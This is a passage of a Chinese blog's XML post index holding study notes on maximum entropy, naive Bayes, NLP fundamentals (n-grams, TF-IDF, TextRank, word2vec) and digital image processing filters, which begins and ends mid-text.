j\leq N}[\delta_{t-1}(j)a_{ji}]b_i(o_t)$$ $$\psi_t(i)=\arg\max_{1\leq j\leq N}[\delta_{t-1}(j)a_{ji}]$$ (3) 终止$$P^*=\max_{1\leq i\leq N}\delta_T(i)$$ $$i_T^*=\arg\max_{1\leq i\leq N}[\delta_T(i)]$$ (4) 最优路径回溯 对于 $t=T-1,T-2,…,1$，有$$i_t^=\psi_{t+1}(i_{t+1}^)$$至此，得到最优路径（序列）$I^=(i_1^,i_2^,…,i_T^)$。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（9）：最大熵模型]]></title>
    <url>%2F2019%2F09%2F26%2FMaxEnt%2F</url>
    <content type="text"><![CDATA[本文将讲解有关最大熵模型的相关知识。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 最大熵模型的基本思想就是：在满足所有约束条件的模型P(Y|X)中，熵最大的模型就是最优的模型。下面先来介绍几个基本概念。 一、基本概念熵熵表示一个系统的混乱程度，假设随机变量X的概率分布式P，则其熵的定义为：$$H(P)=-\sum_x{ P(x)\log P(x)}$$熵有个性质就是当随机变量X服从均匀分布时，熵最大。 条件熵条件熵定义为X给定的条件下Y的条件概率分布的熵对X的数学期望：$$H(Y|X)=−\sum_{x,y}P(x,y)\ln P(y|x)$$ 经验分布设$(X_1,X_2,…,X_n)$是总体 X 的一个样本集，$(x_1,x_2,…,x_n)$是对应样本的观测值，则总体 X 的经验分布为：$$F_n(x)=\frac{1}{n}\sum_{i=1}^n{I{(x_i\leq x)}}$$其中 $I()$是指示函数，当其中的条件成立时函数值为1，反之为0。$\sum_{i=1}^n{I{(x_i\leq x)}}$ 表示样本观测值 $(x_1,x_2,…,x_n)$ 中不大于 $x$ 的个数。 如下图所示，经验分布函数 $F_n(x)$ 的图像是一条跳跃上升的阶梯型曲线，若样本观测值 $(x_1,x_2,…,x_n)$ 中没有重复的值，则每一跳跃的间隔为 $\frac{1}{n}$，若某一数值重复 $k$ 次，则跳跃间隔为 $\frac{k}{n}$。 二、最大熵模型假设分类模型是一个条件概率分布为$P(Y|X)$，它表示在给定样本的特征 X 的前提下，该样本属于类别 Y 的概率。$C$ 是满足所有约束条件的模型的集合。定义在条件概率分布 $P(Y|X)$ 上的条件熵为：$$H(P)=−\sum_{x,y}\tilde P(x)P(y|x)\ln P(y|x)\quad\quad公式(1)$$其中 $\tilde P(x)$ 是 $P(x)$ 的经验分布，$\ln P(y|x)$ 是特征函数，用来描述输入 x 和输出 y 之间的某一个事实。 不知道大家有没有发现一个问题，标准的条件熵的定义是：$$H(Y|X)=−\sum_{x,y}P(x,y)\ln P(y|x)$$和公式(1)相比，标准条件熵中的是 $P(x,y)$，而不是 $\tilde P(x)P(y|x)$，这是因为 $P(x,y)$ 并不容易求出，所以可以利用全概率公式 $P(x,y)=P(x)P(y|x)$ 来做一步转换，但是 $P(x)$ 我们也不知道。所以又可以根据大数定律，在当样本量足够大时，可以用经验分布 $\tilde P(x)$ 近似表示真实的概率分布 $P(x)$。 公式 (1) 中 $\sum_{x,y}P(y|x)\ln P(y|x)$ 又可以看作是模型 $P(y|x)$ 关于特征函数的期望，而在样本集给定的前提下 $\tilde P(x)$ 是一个常数，所以不会对公式 (1) 的单调性产生影响。也就是说我们所要求的条件熵（公式 (1) ）的最大值就是模型期望的最大值。 三、最大熵模型的求解最大熵模型的求解过程就是在满足所有约数条件的前提下，求公式 (1) 取得最大值时模型的参数，即：$$max_{P\in C}\quad H(P)=−\sum_{x,y}\tilde P(x)P(y|x)\ln P(y|x)$$ $$s.t.\quad\quad E_p(f_i)=E_{\tilde P}(f_i),\quad i=1,2,…,n$$ $$\sum_yP(y|x)=1$$ 按照求解优化问题的习惯，我们把求解最大值问题改写为等价的求解最小值问题：$$min_{P\in C}\quad-H(P)=\sum_{x,y}\tilde P(x)P(y|x)\ln P(y|x)$$ $$s.t.\quad\quad E_p(f_i)-E_{\tilde P}(f_i)=0,\quad i=1,2,…,n$$ $$\sum_yP(y|x)=1$$ 而对于带约束的求极值问题，往往采用拉氏乘子法来解决，故定义拉氏函数为：$$L(P,w)=-H(P)+w_0[1-\sum_yP(y|x)]+\sum_{i=1}^n{w_i[E_p(f_i)-E_{\tilde P}(f_i)]}$$所要求解的原优化问题便是：$$min_{P\in C}\quad\max_wL(P,w)$$由于原优化问题不好求解，所以转换为相应的对偶问题：$$\max_w\quad min_{P\in C}L(P,w)$$因为拉氏函数 $L(P,w)$ 是关于P的凸函数，所以原始问题的解与对偶问题的解是等价的。只需要先求解$min_{P\in C}L(P,w)$，得到一个关于 $w$ 的函数 $\psi(w)$，然后再求解 $\max_w\psi(w)$ 得到最优的参数 $w$ 就可以了。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[机器学习（8）：朴素贝叶斯]]></title>
    <url>%2F2019%2F09%2F25%2FBayes%2F</url>
    <content type="text"><![CDATA[本文主要讲解有关朴素贝叶斯的相关知识。 本文主要是依据李航老师的《统计学习方法》和邹博老师的机器学习教学视频总结编写的。文中所用到的有关机器学习的基本概念和方法可以参考本人博客中该系列之前的文章，或者直接上网搜索相关的内容。以下文章所列出的公式以及公式的推导读者们最好是在草稿本上自己推导一遍。由于本人水平所限，文章中难免有错误和不当之处，欢迎大家多多批评指正！ 贝叶斯分类是一种利用贝叶斯公式来进行分类的算法总称，其中朴素贝叶斯是最简单的一种，它假设了各个样本特征之间相互独立。 一、先验概率和后验概率先验概率：指根据以往经验和分析得到的概率。 后验概率：事情已经发生，要求这件事情发生的原因是由某个因素引起的可能性的大小。 二、朴素贝叶斯首先来看下贝叶斯公式：$$P(Y|X)=\frac{P(X|Y)\cdot P(Y)}{P(X)}$$当用作对样本进行分类时，可以用下面的公式来理解：$$P(类别|特征)=\frac{P(特征|类别)\cdot P(类别)}{P(特征)}\quad\quad公式(1)$$其中： 已知样本的某个特征，求该样本属于某个类别的概率$P(类别|特征)$； 已知样本所属类别时某个特征出现的概率$P(特征|类别)$； 该样本所属类别出现的概率$P(类别)$； 样本的某个特征出现的概率$P(特征)$ 在最一般的情况下，样本的所有特征不都相互独立，如果样本有多个特征，并且每个特征都有多个不同的取值时，那么要计算$P(特征|类别)$是比较困难的。所以朴素贝叶斯加入了一个很强的假设条件：所有的样本特征都是相互独立的。这样一来，就可以利用以下公式来进行计算了：$$P(特征1,特征2,…,特征n|类别)=\prod_{i=1}^nP(特征i|类别)\quad\quad公式(2)$$这样一来，$P(特征|类别)$ 就变得可以计算了。 三、朴素贝叶斯的参数估计在公式 (1) 中，当给定样本集时，由于计算样本属于每个类别时等式右边的分母都相等，所以只需要计算分子就可以了。而又因为朴素贝叶斯假定了样本的特征之间相互独立，所以 $P(类别)$ 和 $P(特征i|类别)$ 都可以通过极大似然估计法估计出相应的概率，$P(类别)$ 的极大似然估计是：$$P(类别=C_k)=\frac{\sum_{i=1}^N{I(类别=C_k)}}{N}$$其中 N 是样本的个数；$I()$ 是指示函数，当其中条件成立时函数值为1，反之为 0 ；$C_k$是第 k 个类别。 $P(特征|类别)$的极大似然估计为：$$P(特征=A_j|类别=C_k)=\frac{\sum_{i=1}^N{I(特征=A_j,类别=C_k)}}{\sum_{i=1}^NI(类别=C_k)}$$其中 $A_j$ 是第 j 个特征。 至此，公式(1)中等式右边的概率都可以通过给定的样本集计算出来了，带入公式后就得到了$P(类别|特征)$。得到了样本属于每个类别的概率后，只需要把该样本分类为概率最高的类就好了。 四、贝叶斯估计从公式(2)中你会发现，如果有一个$P(特征i|类别)$为0，则整个概率就为0了，这会使分类产生一定的误差，为了解决该办法可以使用贝叶斯估计，具体的贝叶斯估计如下：$$P(类别=C_i|特征=A_j)=\frac{\sum I(特征=A_j,类别=C_i)+\lambda}{\sum I(类别=C_i)+S_j\cdot\lambda}$$其中 $S_j$是第 j 个特征的取值个数； $\lambda$ 是一个非负数，该值通常取 1 ，这时成为拉普拉斯平滑，而当 $\lambda=0$ 时就是极大似然 估计。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[自然语言处理（NLP）学习笔记]]></title>
    <url>%2F2019%2F09%2F24%2FNLP%2F</url>
    <content type="text"><![CDATA[本文是关于本人研究生期间自然语言处理课程的学习笔记，仅仅是为了方便自己整理和记忆知识点，不能保证所提到知识点全部正确，并且文章结构可能会比较零碎和杂乱，尽量在一段时间后定期整理笔记。 语义理解：(1) 语义相似 (2) 语义关系 (3) 语篇关系 (4) 知识图谱 NLP 任务：文本分类/聚类/摘要、信息检索、检索式对话生成系统 噪声信道模型 熵 Entropy$$H(x)=-\sum_{x\in X}p(x)\log_2p(x)$$ 联合熵 Joint Entropy$$H(X,Y)=-\sum_{x\in X}\sum_{y\in Y}p(x,y)\log p(x,y)$$ 条件熵 Conditional Entropy$$H(Y|X)=\sum_{x\in X}p(x)H(Y|X=x)$$ $$H(X|X)=0$$ $$H(X_1,X_2,…,X_n)=H(X_1)+H(X_2|X_1)+…+H(X_n|X_1,X_2,…,X_n)$$ 相对熵 Relative Entropy$$D(P||Q)=\sum_{x\in X}p(x)\log\frac{p(x)}{q(x)}$$ 它表示对同一随机变量的两个概率分布之间的不同，又称 KL 散度。相对熵是非对称的。$D(P||Q)\geq0$ 互信息$$I(X,Y)=D(p(x,y)||p(x)p(y))$$ 它表示联合分布与独立分布之间的不同 交叉熵 Cross Entropy$$H(X,Q)=-\sum_{x}P(x)\log Q(x)$$ P(x) 是真实分布，Q(x) 是预测分布$$H(X,Q)=H(X)+D(p||Q)$$ 熵率$$\frac{1}{n}H(X_1^n)\quad\quad x_i,i=1,2,…,n$$ 混乱度 以下是一个NLP网课的笔记。 一、语言模型NLP 的一个基本问题是：给定一串字幕，确定下一个最大可能性出现的字母是什么？ 语言模型就是用于评估文本符合语言使用习惯程度的模型。 如果每个单词 $w_i$ 都要依赖于从第一个单词 $w_1$ 到它之前一个单词 $w_{i-1}$ 的影响，则：$$p(w_1w_2…w_n)=p(w_1)p(w_2|w_1)p(w_3|w_2w_1)…p(w_n|w_{n-1}…w_2w_1)$$则参数空间过大，不容易计算，并且数据稀疏严重，单词同时出现的概率可能为0，这会导致最终的结果为0. n-gram（n 元文法）语言模型是一种基于统计语言的模型，是一个基于概率的判别模型，它的输入是一句话（单词的顺序序列），输出是这句话的概率，即这些单词的联合概率。常用的有 Bi-gram（n=2）和 Tri-gram（n=3）。 n-gram 就是把每 n 个单词看作一个字节片段，该模型基于马尔科夫假设：假设在一段文本中，第 n 个词的出现只于它前面 n-1 个词相关。这个假设大大简化了计算过程。 n-gram 语言模型的评价方法：困惑度/混乱度（perplexity），其基本思想是给测试集赋予较高概率值的语言模型较好 二、语料库和语言知识库语料库：存放在计算机中的原始语料文本或经过加过后带有语言学信息标注的语料文本。 三、词法分析词法分析任务：将句子转换为词序列并标记句子中的词的词性。 英文词法分析（曲折语）：1. 英文单词识别、词形还原 2. 未登录词处理 3. 英文词性标注 中文词法分析（孤立语）：1. 分词 2. 未登录词识别 3. 词性标注 分词涉及到的问题有：1. 分词标准 2. 切分歧义问题（分词阶段最困难的问题） 3. 未登录词处理 切分歧义可分为交集型歧义和组合型歧义，前者是指字串 abc 既可以分为 ab/c，又可以分为 a/bc。组合型歧义是指 ab 为词，而 a 和 b 在句子中又可以分别单独成词。而以上两种的混合为混合型歧义。 自动分词算法有基于（语言学）规则的方法和基于统计的方法。基于规则的方法需要事先建立好分词词典，经典的算法有最大匹配法（Maximum Matching, MM）。最大匹配算法可分为正向/逆向/双向最大匹配算法。正向最大匹配算法是从左到右将待分词文本中国你的几个连续字符在字典中找其最大匹配的词，并据此进行划分。其优点是程序简单，缺点是会受词典大小的影响。基于统计的方法利用字与字之间、词与词之间的同时出现的频率作为分词的依据。这种方法需要大量标注的语料库。 英文的自动分词工具有 NLTK，中文的自动分词工具有 jieba 和 pkuseg（效果更好）等。 TF-IDF 算法 可用该算法提取关键字$$词频(TF)=\frac{某个词在文章中出现的次数}{文章的总词数}$$但是当多个词在同一篇文章中出现的次数一样时，它们的重要性可能是不一样的，当不常见的词出现的次数较多时，则该词就很重要了，所以又引入了以下概念：$$逆文档频率(IDF)=\log\frac{语料库的文档总数}{包含该词的文档数+1}$$ $$TF-IDF=词频(TF)\times 逆文档频率(IDF)$$ PageRank 算法 把互联网看作一个有向图，每个网页看作一个节点，而如果网页 A 中有指向网页 B 的超链接，则在有向图中有一个从节点 A 指向节点 B 的有向边。 网页重要性的计算公式为：$$S(V_i)=(1-d)+d\times \sum_{j\in In(V_i)}\frac{1}{|Out(V_j)|}S(V_j)$$其中 d 是阻尼系数，一般设置为 0.85。$In(V_i)$ 是存在指向网页 i 的链接的网页集合。$Out(V_j)$ 是网页 j 中的链接指向的网页的集合。在初始时，每个网页的重要性 $S(V_i)$ 可以设为 1，利用以上公式经过多次迭代便可以得到最终结果。 该公式表示一个网页的重要性由指向该网页的超链接所在的网页的重要性所决定。 TextRank 自动摘要 在 TextRank 所构建的图中，节点就是句子，权重 w 就是两个句子 $S_i$ 和 $S_j$ 的相似程度，两个句子的相似度用以下公式来计算：$$Similarity(S_i,S_j)=\frac{(w_k|w_k\in S_i\quad&amp;\quad w_k\in S_j)}{\log(|S_i|)+\log(|S_j|)}$$TextRank 公式在 PageRank 公式的基础上，为图中的边引入了权值的概念：$$WS(V_i)=(1-d)+d\times \sum_{j\in In(V_i)}\frac{w_{ji}}{\sum_{V_k\in Out(V_j)}w_{jk}}WS(V_j)$$其中 $w_{ij}$ 是从节点 $V_i$ 到 $V_j$ 的边的权值。算法流程为：将文本进行分词和词性标注处理，去除停用词或词性筛选等之后，设定窗口长度为 K，即最多只能出现 K 个词，进行窗口滑动，在窗口中共同出现的词之间即可建立起无向边。初始化边的权重， 根据公式进行迭代权重，直到收敛。则词的重要性最大的几个词就为提取到的关键词。 四、句法分析句法分析的任务就是确定句子的句法结构或句子中词汇之间的依存关系。 句法分析的分类如下图所示： 完全句法分析是确定句子包含的全部句法信息，并确定句子中各成分之间的关系。局部句法分析只要求识别句子中某些结构相对简单的独立成分。依存句法分析需要分析出词与词之间的依存关系。 依存句法通过分析语言单位内成分之间的依存关系来解释其句法结构，主张句子中核心动词是支配其他成分的中心成分，而它本身却不受其他任何成分的支配，所有受支配成分都以某种关系从属于支配者。需满足 5 个条件： （1）一个句子中只有一个成分是独立的（2）句子的其他成分都从属于某一成分（3）任何一个成分都不能依存于两个或两个以上的成分（4）如果成分A直接从属成分B，而成分C在句子中位于A和B之间，那么，成分C或者从属于A，或者从属于B，或者从属于A和B之间的某一成分（5）中心成分左右两边的其他成分相互不发生关系 词与词之间直接发生依存关系，构成一个依存对，其中一个是核心词，也称为支配词，另一个叫修饰词，也称为从属词。依存关系用一个有向弧表示，叫做依存弧，其方向可自己定义。 可以使用 spacy 来进行句法分析，其安装语句为 pip install spacy，下载英文数据及其对应模型： python -m spacy download en 五、语义分析语义分析可以分为词语语义分析和句子语义分析。 词语语义分析词语相似度就是两个词语在不同的上下文中可以相互替代使用而不改变文本的句法语义结构的程度。其取值范围一般为 [0,1]。 当直接计算词语相似度比较困难时，可以先计算词语距离，再转换为词语相似度。词语相似度 $Sim(W_1,W_2)$ 与词语距离 $Dis(W_1,W_2)$ 的关系为：$$Sim(W_1,W_2)=\frac{\alpha}{Dis(W_1,W_2)+\alpha}$$其中 $\alpha$ 是一个可调节的参数，其含义为：当相似度为 0.5 时的词语距离值。 词语相关性是指两个词语相互关联的程度，可以用两个词语在同一语境中共同出现的可能性来衡量。其取值范围一般为 [0,1]。 词语相似度的计算方法：在由一棵或多棵树形成的同义词词典中，两个概念的语义距离可以表示为对应节点之间的路径长度。除此之外还可以考虑概念层次树的深度（如果两对概念之间的路径长度相等，则处于语义树较低层的语义距离更小）以及概念层次树的区域密度（如果两对概念之间的路径长度相等，则处于较高密度区域的语义距离更大）。 句子语义分析知网（hownet）不同于查论文的中国知网，是一个主要面向中文的大型的语言知识库。 句子（语义）相似度的计算可以分为两种方法：基于向量空间模型的方法和对语句进行完全的句法与语义分析。前者将句子看作词的线性序列，用组成句子的词的词频和词性等信息来衡量语句相似度；后者在两个句子进行深层的句法、语义分析的基础上进行相似度的计算。 基于语义依存的汉语句子相似度计算：对句子进行依存分析，然后再依存结构的基础上计算句子相似度。 有效搭配对：全句核心词和直接依存于其有效词组成的搭配对，这里有效词定义为动词、名次和形容词。 （1）基于关键词匹配的方法 相似度计算公式：$$Sim(Sen1,Sen2)=\frac{\sum_{i=1}^nW_i}{Max(PairCount1,PairCount2)}$$其中 $\sum_{i=1}^nW_i$ 是句子1和句子2有效搭配对匹配的总权重，PairCount1 是句子1的有效搭配对数。如果两个搭配对 a=b c=d，则匹配权重为1；如果 a=b c!=d 或 a!=b c=d，则匹配权重为 0.5；如果 a!=b c!=d，则匹配权重为 0。 （2）基于语义匹配的方法 利用知网对词做义元分析，即对经过分词和词性标注后的句子进行语义消歧，并在每个词后标注上相应的语义号。匹配权重的计算方法与上述相同。 （3）关键词与语义融合的方法$$S(Sen1,Sen2)=\lambda Sim_{关键词}(Sen1,Sen2)+(1-\lambda)Sim_{语义}(Sen1,Sen2)$$ 六、词向量词向量就是用向量的形式来表示自然语言中词的方法，常用的方式有以下几种： One-hot（独热）向量：如果有 n 个词，则把每个词编码为 n 维的 one-hot 向量。但是这种方式存在词汇鸿沟（无法表示词与词之间的相关性）以及维度灾难等问题。 Distributed Representation（Word Embeding）：通过训练将词表示成固定长度的短向量，相似的词向量之间距离相近。 NNLM（神经网络语言）模型 所用到的神经网络主要可分为输入层、投影层、隐藏层和输出层。假设语料库有 10w 个词，投影层有 300 个神经元，滑动窗口为 3 时，滑动窗口会遍历整个语料库，每次向神经网络输入 3 个词。输入的词向量和投影矩阵 C 相乘就把 10w 维的向量转化为了 300 维的向量。投影层再采用全连接的方式与隐藏层连接，并经过 tanh 激活函数激活后进行输出。隐藏层和输出层也是全连接的方式，经过 softmax 函数处理后得到最终的结果。经过多次反向传播更新参数后，投影矩阵 C 的每一列就是对应的每个词的词向量表示。 word2vec word2vec 是用于生成词向量的计算模型，不仅高效，而且还可以获得不同词之间的相似性。 CBOW 模型 输入是某个特征词的上下文相关的词对应的向量，输出是这个特定词的词向量。 无隐藏层，使用双向上下文窗口（由当前词的上下文确定该词），输入层直接使用低维稠密表示，投影层简化为加和取平均。 目标函数：$J=\sum_{i\in corpus,context(i)}\log(\frac{exp(w_i^T\bar{w}j)}{\sum{k=1}^Vexp(w_i^T\bar{w}_k)})$ 负例采样：词典中的每一个词对应一条线段，所有词组成了 [0,1] 之间的剖分$$len(w)=\frac{counter(w)}{\sum_{u\in D}counter(u)}$$Skip-gram 模型：输入是特定词的词向量，而输出是该特定词的上下文词向量。无隐藏层，投影层也可以省略，每个词向量作为 log-linear 模型的输入 word2vec 有两种改进方式，一种是基于层次 softmax 的，另一种是基于负例采样（Negative Sampling）的。 negative sampling 本质是预测总体类别的一个子集 层次 softmax 在 CBOW 模型或 Skip-gram 模型的输出层会用 softmax 计算所有词向量的概率，这无疑是很浪费时间的。可以用霍夫曼树来代替隐藏层和输出层的神经元，霍夫曼树的叶子节点相当于输出层的神经元，第 i 个叶子节点对应着语料库中的第 i 个词，每个词在语料库中出现的次数作为叶子节点的权重。 而内部节点则起到隐藏层神经元的作用。在霍夫曼树中，隐藏层到输出层的 softmax 映射不是一下子完成的，而是沿着霍夫曼树一步步完成的，因此这种 softmax 取名为”Hierarchical Softmax”。 哈夫曼树的每一次分支可以看作是一次二分类。对于词典 D 中的任意词 w，在哈夫曼树中必然只存在一条从根节点到对应的叶子节点的路径，这条路径上的每一个分支看作是一次二分类，每一次二分类就产生一个概率，将这些概率乘起来就是要求的 $p(w|Context(w))$。 下面以 CBOW 模型为例，说一下神经网络的损失函数、输入、输出及计算流程，尽量不涉及复杂的公式推导。 由于我们要用某个词的上下文信息推导出该词，也就是让条件概率 $p(w|Context(w))$ 最大。其中 w 是所求词，Context(w) 是该词的上下文（也就是前后各 k 个词）。那么损失函数可以设为：$$Loss=\log p(w|Context(w))$$模型的输入是所求词前后各 k 个词对应的词向量，输出是所求词的词向量。与原始的 CBOW 模型不同的是，从输入层到投影层不再是做全连接和激活函数，而是将输入的这 2k 个词向量求和（对应的元素相加）。求和后的词向量直接作为哈夫曼树（输出层）的输入，计算所经过的路径后相应叶子节点的概率值。 使用霍夫曼树有什么好处呢？首先，由于是二叉树，之前计算量为V,现在变成了log2V。第二，由于使用霍夫曼树是高频的词靠近树根，这样高频词需要更少的时间会被找到，这符合我们的贪心优化思想。 七、文本分类文本分类系统主要包括预处理、文本表示和分类器等过程。 文本分类步骤：文本表示、文本特征、分类器设计、文本分类性能评测 文本表示就是用计算机可处理的方式表示文本，常见的有向量空间模型（VSM），也称为词袋模型（BOW） 评测指标：准确率和召回率$$准确率\quad P=\frac{分类正确的文本数}{总的文本数}\times100%$$ $$召回率\quad R=\frac{分类正确的文本数}{应有的文本数}\times100%$$]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[数字图像处理学习笔记]]></title>
    <url>%2F2019%2F09%2F24%2FDIP%2F</url>
    <content type="text"><![CDATA[本文是关于本人研究生期间数字图像处理课程的学习笔记，仅仅是为了方便自己整理和记忆知识点，不能保证所提到知识点全部正确，并且文章结构可能会比较零碎和杂乱，尽量在一段时间后定期整理笔记。 第二章：基础灰度值 [0,255] ，0 表示黑色，255 表示白色。 课程内容主要包括：图像增强/去噪/复原/压缩/融合/识别/修补等内容。 图像 $I=f(x,y)=i(x,y)\cdot r(x,y)$，其中 $i(x,y)$ 是入射分量，取决于照射源；$r(x,y)$ 是反射分量，取决于被照物体。$0&lt;i(x,y)&lt;\infty$，$0&lt;r(x,y)&lt;1$。 分辨率 DPI：单位长度上采样的像素数 CMY 彩色空间：三基色（青色、洋红色、黄色）相减模型 HSI 彩色空间：色调、饱和度、强度 图像的存储方式可以按像素存储（它的三种颜色的值），或按颜色存储（先存储所有像素的红色值，再存黄色，再存蓝色） BMP 图像是无损压缩的位图 TIFF 是比较经典的图像格式，功能强 DICOM 是医学图像，拓展名为 DCM 相邻像素： (1) 4邻域$N_4(P)$：上下左右四个相邻像素； (2) 8邻域 $N_8(P)$：上下左右、左上、左下、右上、右下8个相邻像素； (3) D 邻域 $N_D(P)$：左上、左下、右上、右下4个相邻像素。 像素的邻接（连通）性：像素是否相邻并且相似 (1) 4 邻接：q 在 p 的 4 邻域内，并且两个像素相似 (2) 8 邻接：q 在 p 的 8 邻域内，并且两个像素相似 (3) M 邻接（混合邻接）：具有相似值的两个像素 q 和 p 满足 【q 在 $N_4(p)$ 内）】 或 【q 在 $N_D(p)$ 内 并且 $N_4(p)\cap N_4(q)$ 中像素值不相似】，则 p 和 q 是 M 邻接的。即：当像素间同时存在4邻接和8邻接时，优先采用4邻接，屏蔽和一个像素同时存在4邻接的两个像素之间的8邻接。 通路：从坐标为 (x,y) 的点 p 到坐标为 (s,t) 的点 q 的路径 两个像素 p(x,y) 和 q(s,t) 间的距离： $D_4$ 距离（城市距离）：D(p,q)=|x-s|+|y-t| $D_8$ 距离（棋盘距离）：D(p,q)=max(|x-s|,|y-t|) 第三章：图像增强图像增强就是人为地突出图像中的部分细节，而压制另一部分信号。 空域增强：对图像像素处理 $g(x,y)=T[f(x,y)]$ ，其中 T 是某种操作 频域增强：修改图像的傅里叶变换 图像的点运算(1) 反转：$s=(L-1)-r$，[0 , L-1] 是图像的灰度级，r 是点的像素值 (2) 对数变换：$s=c\cdot \log(1+r),r\geq 0$，c为常数 (3) 幂次变换：$s=c\cdot r^{\gamma}$ ，c 和 $\gamma$ 是两个正的常数。当 $\gamma&gt;1$ 时提高灰度级，使图像变亮，反之变暗。 (4) 对比度扩展：增强图像各部分的反差，突出感兴趣的区间，抑制不感兴趣的区间。 (5) 灰度变换：从原图的像素灰度范围 [a,b] 线性映射到结果图像的像素灰度范围 [c,d]。此外也可以对低于最低值和超过最高值的部分进行另外的线性变换（分段线性变换）。 灰度变换可分为全域线性变换和分段线性变换。全域线性变换：如果是原图大部分像素值范围为 [c,d] ，还可以把低于最低值 c 和超过最高值 d 的部分经变换后设为 c 和 d。分段线性变换又包括：削波（从原像素范围[a,b]转换为[0,255]，把低于最小值和超过最大值的地方分别设为0和255）、阈值化（高于某个值为255，反之为0） (6) 灰度级切片：将关心的像素值范围设为较高值，而其他设为较低值。或者关心范围设为较高值，其他保持不变。 图像的代数运算(1) 加法：$g(x,y)=\alpha f(x,y)+\beta h(x,y),\alpha+\beta=1$ ，可以实现去噪、叠加（相加取平均去噪声） (2) 减法：显示两幅图片的差异，可以提取运动中的物体，去除背景 (3) 乘法：对应点相乘（用二值模板做，提取感兴趣的区域） (4) 除法：一副图像取反后与另一幅图像相乘 (5) 非：$g(x,y)=255-f(x,y)$，每种颜色取其补色 (6) 与：取相交的子图（用模板提取感兴趣的子图像） (7) 或：合并图像（用模板提取感兴趣的子图像） (8) 异或：获得相交子图 直方图：表达图像灰度级分布情况直方图均衡化：因为图片的灰度大多分布在较窄的区间，从而导致图像细节不清晰，直方图均衡化可使图像的灰度分布均匀，增大反差，使细节清晰，其步骤如下： 统计灰度值得直方图： $P_r(r_k)=n_k/N$，$r_k$ 是第 k 个灰度级，$n_k$ 是该灰度在图像的数量。这一步是求所有灰度级在图像中所占的比例； 累计分布变换：$S_t=T(r_k)=\sum_{j=0}^kP_r(r_j)=\sum_{j=0}^k\frac{n_j}{n}$，求得灰度级的累计分布概率； 变换后的灰度级：$S(k)=int[(\max(r_k)-\min(r_k))\cdot S_k+0.5]$，$max(r_k)$ 表示灰度级的最大值，如果有 0~7 共 8 级灰度，则该值为 7。S(3)=2 表示原来为 3 的灰度级经变换后变为了为 2 的灰度级。 其基本思想是合并灰度级使概率大体一致，但是灰度级的数量可能会减少。 空间滤波器：包括平滑空间滤波器和锐化空间滤波器。平滑滤波器：可对图像进行模糊处理、降噪平滑滤波器分类： (1) 线性滤波器（平均滤波器）：邻域内像素值去平均，可以去除高斯噪声 (2) 统计排序滤波器：有中值/最大/最小滤波器几种 对点、线、尖顶等细节较多的图像不适合用中值滤波器，中值滤波器在去噪的同时可保存细节，去除脉冲（椒盐）噪声。这种噪声的特点是高灰度级和低灰度级的噪声多。 最大值滤波器可去除暗点，最小值滤波器可去除亮点。 均值与积分相似，可产生钝化的效果；微分可产生锐化的效果。 锐化滤波器：突出细节、边缘提取，图像上的边缘反应为相邻像素的跃变一阶微分边缘检测：若边缘梯度超过阈值，则改边缘就被设定为当前边缘。梯度法（水平或垂直梯度）：$\nabla g(x,y)=|G_x|+|G_y|$，$G_x,G_y$ 分别为水平和垂直梯度。$$\begin{bmatrix} &amp; &amp; \ &amp; -1&amp;1\ &amp; 1&amp; \end{bmatrix}$$新像素值=abs(中-右) + abs(中-下) Roberts 算法（交叉差分）：$$\begin{bmatrix} &amp; &amp; \ &amp; -1&amp;-1\ &amp; 1&amp;1 \end{bmatrix}$$新像素值=abs(右下-中) + abs(右-下) Sobel 算法：检测到的边缘较其他更加平滑光洁，取水平差分和垂直差分中的较大者 或 取两种差分之和$$\begin{bmatrix} -1&amp; &amp;1 \ -2&amp; &amp;2\ -1&amp; &amp;1 \end{bmatrix}$$新像素值=abs((右上-左上) + 2*(右-左) + (右下-左上)) 或$$\begin{bmatrix} -1&amp; -2&amp; -1\ &amp; &amp;\ 1&amp; 2&amp;1 \end{bmatrix}$$差分模板的权值系数为 0 prewitt 算子：对噪声敏感$$\begin{bmatrix} -1&amp; &amp;1 \ -1&amp; &amp;1\ -1&amp; &amp;1 \end{bmatrix}$$新像素值=(右上+右+右下) - (左上+左+左下) 或$$\begin{bmatrix} -1&amp; -1&amp; -1\ &amp; &amp;\ 1&amp; 1&amp;1 \end{bmatrix}$$一阶微分边缘检测会突出小缺陷，去除慢变化的背景 二阶微分边缘检测——拉普拉斯算子，可增强图像突变处的对比度二元图像函数 $f(x,y)$ 的拉普拉斯变换：$$\nabla^2f=\frac{\partial^2 f}{\partial x^2}+\frac{\partial^2 f}{\partial y^2}$$离散形式： x 方向：$$\frac{\partial^2 f}{\partial x^2}=f(x+1,y)+f(x-1,y)-2f(x,y)$$y 方向：$$\frac{\partial^2 f}{\partial y^2}=f(x,y+1)+f(x,y-1)-2f(x,y)$$ 故二维拉普拉斯数字实现由以上两个分量相加：$$\nabla^2f=[f(x+1,y)+f(x-1,y)+f(x,y+1)+f(x,y-1)]-4f(x,y)$$ $$\begin{bmatrix} 0&amp; 1&amp; 0\ 1&amp; -4&amp;1\ 0&amp; 1&amp;0 \end{bmatrix}$$ 或$$\begin{bmatrix} 1&amp; 1&amp; 1\ 1&amp; -8&amp;1\ 1&amp; 1&amp;1 \end{bmatrix}$$又或者以上两个矩阵的值都取其相反数。$$\begin{equation}g(x,y)=\left{\begin{aligned}f(x,y)-\nabla^2f(x,y)\f(x,y)+\nabla^2f(x,y)\\end{aligned}\right.\end{equation}$$拉氏变换具有各向同性（旋转不变性），是一个线性操作 拉氏素描算子：因结果中负值会丢失，可以增加偏移量 254，超出 255 时截断为 255 先拉氏得掩模后与原图相加，可写为一步：$$g(x,y)=5f(x,y)-[f(x+1,y)+f(x-1,y)+f(x,y+1)+f(x,y-1)]$$反锐化掩蔽和高频提升滤波处理： 反锐化掩蔽：将图像模糊形式从原图中去除 $f(x,y)-\bar{f}(x,y)$，其中 